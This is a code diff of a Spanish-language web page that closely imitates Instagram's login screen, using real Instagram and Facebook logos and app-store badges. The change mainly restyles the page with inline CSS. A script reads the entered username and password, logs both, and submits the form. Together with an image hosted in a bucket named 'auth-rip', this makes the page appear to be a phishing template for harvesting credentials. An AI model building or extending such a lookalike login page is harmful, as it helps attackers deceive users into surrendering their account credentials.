@@ -1,156 +1,242 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-
     <title>Instagram Login</title>
     <link
       rel="icon"
       href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/1200px-Instagram_icon.png"
       type="image/x-icon"
     />
-    <!-- Cambia esta ruta según la ubicación de tu favicon -->
-    <link
-      href="https://unpkg.com/tailwindcss@^1.0/dist/tailwind.min.css"
-      rel="stylesheet"
-    />
-    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+      body {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        font-family: Arial, sans-serif;
+        background-color: #ffffff;
+      }
+
+      .container {
+        display: flex;
+        flex-direction: row;
+        justify-content: center;
+        align-items: center;
+        background-color: white;
+        padding: 40px;
+      }
+
+      .image-section {
+        flex: 1;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .image-section img {
+        height: 510px;
+      }
+
+      .form-container {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        max-width: 270px;
+        padding: 30px;
+        background-color: white;
+        font-size: 13px;
+        border: 1px solid rgba(0, 0, 0, 0.1);
+      }
+
+      .form-container img {
+        width: 150px;
+        padding: 16px;
+        display: flex;
+        justify-content: center;
+        justify-items: center;
+      }
+
+      .input-field {
+        background-color: #fafafa;
+        padding: 8px;
+        border: 1px solid #dbdbdb;
+        margin-top: 6px;
+        font-size: 11px;
+      }
+
+      .submit-btn {
+        width: 40vh;
+        background-color: #4cb5f9;
+        color: white;
+        padding: 8px;
+        margin-top: 10px;
+        border-radius: 6px;
+        font-size: 12px;
+        border: none;
+        cursor: pointer;
+      }
+
+      .divider {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: 15px;
+        font-size: 13px;
+        opacity: 0.8;
+      }
+
+      .divider div {
+        height: 1px;
+        background-color: black;
+        width: 17vh;
+        opacity: 0.1;
+      }
+
+      .facebook-login {
+        width: 100%;
+        background-color: white;
+        color: #385185;
+        display: flex;
+        font-size: 12px;
+        justify-content: center;
+        align-items: center;
+        cursor: pointer;
+      }
+
+      .forgot-password {
+        margin-top: 10px;
+        font-size: 12px;
+        color: #385185;
+        text-decoration: none;
+      }
+
+      .forgot-password:hover {
+        text-decoration: underline;
+      }
+
+      .signup {
+        margin-top: 10px;
+        border: 1px solid rgba(0, 0, 0, 0.1);
+        color: #4B5563;
+        text-align: center;
+        font-size: 12px;
+      }
+
+      .signup a {
+        color: #3897f0;
+        text-decoration: none;
+      }
+
+      .signup a:hover {
+        text-decoration: underline;
+      }
+
+      .download-apps {
+        margin-top: 20px;
+        text-align: center;
+      }
+
+      .download-apps img {
+        width: auto;
+        height: 40px;
+      }
+
+      .footer {
+        display: flex;
+        justify-content: center;
+        margin-top: 50px;
+        margin-bottom: 20px;
+        width: 1100px;
+        flex-wrap: wrap;
+        font-size: 13px;
+        color: black;
+        opacity: 0.6;
+      }
+
+      @media (max-width: 768px) {
+        .container {
+          flex-direction: column;
+        }
+
+        .image-section {
+          display: none;
+        }
+
+        .image-section img {
+          height: 400px;
+        }
+      }
+    </style>
   </head>
-  <script>
-    function handleForms(e) {
-      e.preventDefault(); // Cambiado a 'e'
-      const form = document.getElementById("login-form");
-      const username = document.getElementById("username").value;
-      const password = document.getElementById("password").value;
-      console.log("username:", username);
-      console.log("pass:", password);
-      document.addEventListener("DOMContentLoaded", () => {
-        const metaInfoArray = [
-          "Meta",
-          "Información",
-          "Blog",
-          "Empleo",
-          "Ayuda",
-          "API",
-          "Privacidad",
-          "Configuración de cookies",
-          "Condiciones",
-          "Ubicaciones",
-          "Instagram Lite",
-          "Threads",
-          "Importación de contactos y no usuarios",
-          "Meta Verified",
-          "Español",
-          "© 2024 Instagram from Meta",
-        ];
-        const metaContainer = document.querySelector(".flex.text-black");
-        metaInfoArray.forEach((info) => {
-          const span = document.createElement("span");
-          span.textContent = info;
-          metaContainer.appendChild(span);
-        });
-      });
-    }
-  </script>
-  <body class="flex flex-col justify-center items-center">
-    <div
-      class="flex flex-col lg:flex-row gap-2 justify-center items-center bg-white"
-    >
-      <div class="hidden lg:block">
+  <body>
+    <div class="container">
+      <div class="image-section">
         <img
           src="https://firebasestorage.googleapis.com/v0/b/auth-rip.appspot.com/o/ig.jpg?alt=media&token=ccc1ca33-911f-4b8e-8667-815ca6ff403f"
           alt="Instagram app mockup"
-          class="mx-auto h-[600px]"
         />
       </div>
-      <div class="flex flex-col">
-        <div
-          class="w-full flex flex-col items-center max-w-md mt-10 p-10 bg-white border"
-          style="width: 370px; font-size: 13px"
-        >
+      <div>
+        <div class="form-container">
           <img
-            class="w-[200px] p-6 flex items-center justify-center"
             src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/200px-Instagram_logo.svg.png?20160616034027"
             alt="Instagram Logo"
           />
-          <form id="login-form" class="flex flex-col w-full"  method="POST" action="#" onsubmit="handleForms(event)"   >
+          <form
+            id="login-form"
+            class="flex flex-col w-full"
+            action="#"
+            style="display: flex; justify-items: center; flex-direction: column;"
+            method="POST"
+            onsubmit="handleForms(event)"
+          >
             <input
               id="username"
               type="text"
+              style="opacity: 80%;"
               placeholder="Teléfono, usuario o correo electrónico"
-              class="w-full bg-[#FAFAFA] p-2 border"
+              class="input-field"
             />
             <input
               id="password"
               type="password"
+              style="opacity: 80%;"
               placeholder="Contraseña"
-              class="w-full p-2 mt-2 border bg-[#FAFAFA]"
+              class="input-field"
             />
-            <button
-              type="submit"
-              class="w-full bg-[#4CB5F9] text-white py-2 mt-4 rounded-lg"
-              style="background-color: #4cb5f9"
-            >
-              Iniciar sesión
-            </button>
+            <button type="submit" class="submit-btn">Iniciar sesión</button>
           </form>
-          <div
-            class="mt-4 flex justify-between items-center gap-4 text-center text-sm"
-          >
-            <div
-              class="size-[0.5px]"
-              style="
-                background-color: black;
-                color: black;
-                opacity: 10%;
-                width: 110px;
-              "
-            ></div>
+          <div class="divider">
+            <div style="margin: 10px;"></div>
             <span>O</span>
-            <div
-              class="size-[0.5px]"
-              style="
-                background-color: black;
-                color: black;
-                opacity: 10%;
-                width: 110px;
-              "
-            ></div>
+            <div style="margin: 10px;"></div>
           </div>
-          <div
-            class="w-full cursor-pointer bg-white text-[#385185] mt-4 py-2 rounded-md flex items-center justify-center"
-          >
+          <div class="facebook-login">
             <img
               src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTQKrFhY-ljA-u7J5IMWeTv8zmpBx4PP9nQMw&s"
               alt="Facebook logo"
-              class="mr-2 size-6"
+              style="width: 15px;"
             />
             Iniciar sesión con Facebook
           </div>
-          <div class="mt-4 text-center">
-            <a href="#" class="text-sm text-[#385185] hover:underline"
-              >¿Olvidaste tu contraseña?</a
-            >
+          <div class="forgot-password">
+            <span href="#">¿Olvidaste tu contraseña?</span>
           </div>
         </div>
-
-        <div class="mt-2 text-center border p-4">
-          <p class="text-sm text-gray-600">
-            ¿No tienes una cuenta?
-            <a href="#" class="text-blue-500 hover:underline">Regístrate</a>
-          </p>
+        <div class="signup" style="padding: 6px;">
+          <p>¿No tienes una cuenta? <a href="#" style="color: #3B82F6;">Regístrate</a></p>
         </div>
-        <div class="mt-6 text-center rounded-lg p-2">
-          <p class="text-sm text-gray-600 mb-2">Descarga la app.</p>
-          <div class="flex justify-center space-x-4">
+        <div class="download-apps">
+          <p style="color: #4B5563;font-size: 12px; margin-top: 30px;">Descarga la app.</p>
+          <div>
             <img
-              class="w-32"
               src="https://static.cdninstagram.com/rsrc.php/v3/yT/r/0BpxdgM3WUr.png"
               alt="Get it on Google Play"
             />
             <img
-              class="w-32"
               src="https://static.cdninstagram.com/rsrc.php/v3/y9/r/LjIQEL8csb0.png"
               alt="Get it from Microsoft"
             />
@@ -158,10 +244,16 @@
         </div>
       </div>
     </div>
-
-    <div
-      class="flex text-black gap-2 mt-10 mb-10 w-[1100px] flex-wrap justify-center text-[13px] opacity-60"
-    >
-    </div>
   </body>
+  <script>
+    function handleForms(e) {
+      e.preventDefault();
+      const form = document.getElementById("login-form");
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+      console.log("username:", username);
+      console.log("pass:", password);
+      form.submit();
+    }
+  </script>
 </html>
